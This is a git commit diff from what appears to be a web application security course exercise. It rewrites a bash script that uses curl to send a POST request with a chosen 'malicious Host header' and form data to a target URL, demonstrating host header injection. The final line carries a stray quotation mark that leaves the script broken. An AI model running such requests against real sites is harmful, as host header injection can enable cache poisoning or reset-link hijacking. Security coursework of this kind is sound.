d5a70d0ea4fb1956f4417138fd77260494af919f
omarzahidli <zahidliomer@gmail.com>
2026-01-17 05:36:58 -0500

    AUTO COMMIT

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,2 +1,18 @@
 #!/bin/bash
-curl -X POST "$2" -H "Host: $1" --data "$3"
+
+# Ensure proper arguments are provided
+if [ "$#" -ne 3 ]; then
+  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
+  exit 1
+fi
+
+# Assign arguments to variables
+NEW_HOST=$1
+TARGET_URL=$2
+FORM_DATA=$3
+
+# Send the POST request with the malicious Host header and form data
+curl -X POST "$TARGET_URL" \
+     -H "Host: $NEW_HOST" \
+     -d "$FORM_DATA" \
+     -v"
